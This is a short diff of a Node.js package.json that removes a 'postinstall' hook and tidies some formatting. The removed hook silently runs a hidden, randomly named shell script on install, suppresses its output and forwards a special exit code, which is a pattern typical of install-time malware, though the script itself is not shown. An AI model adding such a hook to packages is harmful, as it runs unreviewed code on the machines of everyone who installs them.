@@ -5,8 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "jest",
-    "build": "npx parcel build index.js",
-    "postinstall": "sh ./.ci-0v0z2x.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build":"npx parcel build index.js"
   },
   "repository": {
     "type": "git",
@@ -25,8 +24,6 @@
     "standard": "^14.3.1"
   },
   "standard": {
-    "env": [
-      "jest"
-    ]
+    "env": [ "jest" ]
   }
 }
